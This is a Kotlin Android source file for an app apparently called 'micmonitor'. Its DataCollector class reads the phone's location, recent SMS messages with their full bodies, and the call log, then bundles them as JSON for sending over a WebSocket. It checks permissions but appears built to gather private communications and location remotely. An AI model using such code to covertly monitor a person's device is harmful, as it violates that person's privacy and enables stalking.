package com.micmonitor.app

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import android.Manifest

/**
 * DataCollector — reads device data and returns JSON strings
 * ready to be sent over WebSocket as text messages.
 *
 * All methods are safe: they return empty arrays on denied permission.
 */
class DataCollector(private val ctx: Context) {

    companion object {
        const val TAG = "DataCollector"
    }

    private fun hasPermission(perm: String) =
        ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

    // ── Location ────────────────────────────────────────────────────────────
    @SuppressLint("MissingPermission")
    fun getLocation(): JSONObject {
        val obj = JSONObject()
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
            !hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
            obj.put("error", "permission_denied")
            return obj
        }
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var best: Location? = null
            val providers = listOf(
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER,
                LocationManager.PASSIVE_PROVIDER
            )
            for (provider in providers) {
                if (!lm.isProviderEnabled(provider)) continue
                val loc = lm.getLastKnownLocation(provider) ?: continue
                if (best == null || loc.accuracy < best.accuracy) best = loc
            }
            if (best != null) {
                obj.put("lat", best.latitude)
                obj.put("lon", best.longitude)
                obj.put("accuracy", best.accuracy)
                obj.put("altitude", best.altitude)
                obj.put("provider", best.provider)
                obj.put("time", best.time)
            } else {
                obj.put("error", "unavailable")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Location error: ${e.message}")
            obj.put("error", e.message)
        }
        return obj
    }

    // ── SMS ─────────────────────────────────────────────────────────────────
    fun getSms(limit: Int = 30): JSONArray {
        val arr = JSONArray()
        if (!hasPermission(Manifest.permission.READ_SMS)) return arr
        try {
            val uri = Telephony.Sms.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ
            )
            val cursor: Cursor? = ctx.contentResolver.query(
                uri, projection, null, null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val obj = JSONObject()
                    obj.put("id",      it.getString(it.getColumnIndexOrThrow(Telephony.Sms._ID)))
                    obj.put("address", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "")
                    obj.put("body",    it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
                    obj.put("date",    it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                    obj.put("type",    smsTypeLabel(it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))))
                    obj.put("read",    it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.READ)) == 1)
                    arr.put(obj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "SMS error: ${e.message}")
        }
        return arr
    }

    private fun smsTypeLabel(type: Int) = when (type) {
        Telephony.Sms.MESSAGE_TYPE_INBOX  -> "inbox"
        Telephony.Sms.MESSAGE_TYPE_SENT   -> "sent"
        Telephony.Sms.MESSAGE_TYPE_DRAFT  -> "draft"
        else -> "other"
    }

    // ── Call Log ────────────────────────────────────────────────────────────
    fun getCallLog(limit: Int = 30): JSONArray {
        val arr = JSONArray()
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return arr
        try {
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )
            // Do NOT put LIMIT in the sort string — CallLog provider ignores/rejects it on Android 10+
            val cursor: Cursor? = ctx.contentResolver.query(
                uri, projection, null, null,
                "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val obj = JSONObject()
                    obj.put("id",       it.getString(it.getColumnIndexOrThrow(CallLog.Calls._ID)))
                    obj.put("number",   it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
                    // CACHED_NAME may not exist on all devices — use getColumnIndex (not OrThrow)
                    val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    obj.put("name",     if (nameIdx >= 0) (it.getString(nameIdx) ?: "") else "")
                    obj.put("type",     callTypeLabel(it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))))
                    obj.put("date",     it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                    obj.put("duration", it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                    arr.put(obj)
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "CallLog error: ${e.message}")
        }
        return arr
    }

    private fun callTypeLabel(type: Int) = when (type) {
        CallLog.Calls.INCOMING_TYPE  -> "incoming"
        CallLog.Calls.OUTGOING_TYPE  -> "outgoing"
        CallLog.Calls.MISSED_TYPE    -> "missed"
        CallLog.Calls.REJECTED_TYPE  -> "rejected"
        else -> "other"
    }

    // ── Bundle all data ─────────────────────────────────────────────────────
    fun collectAll(): JSONObject {
        val bundle = JSONObject()
        bundle.put("location", getLocation())
        bundle.put("sms",      getSms())
        bundle.put("callLog",  getCallLog())
        bundle.put("timestamp", System.currentTimeMillis())
        return bundle
    }
}
